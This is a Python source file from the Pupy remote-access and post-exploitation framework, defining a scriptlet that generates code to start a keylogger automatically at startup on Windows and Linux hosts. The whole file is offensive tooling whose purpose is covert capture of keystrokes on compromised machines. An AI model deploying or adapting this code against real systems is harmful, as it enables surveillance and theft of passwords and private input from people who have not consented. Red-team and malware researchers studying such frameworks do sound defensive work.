#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from scriptlets import Scriptlet

class ScriptletGenerator(Scriptlet):
    """ start the keylogger at startup """

    dependencies = {
        'windows': ['pupwinutils.keylogger'],
        'linux': ['pupyps', 'display', 'keylogger']
    }
    arguments={}

    def generate(self, os):
        if os == 'windows':
            return 'import pupwinutils.keylogger; pupwinutils.keylogger.keylogger_start()'
        else:
            return 'import keylogger; import display; display.when_attached(keylogger.keylogger_start)'
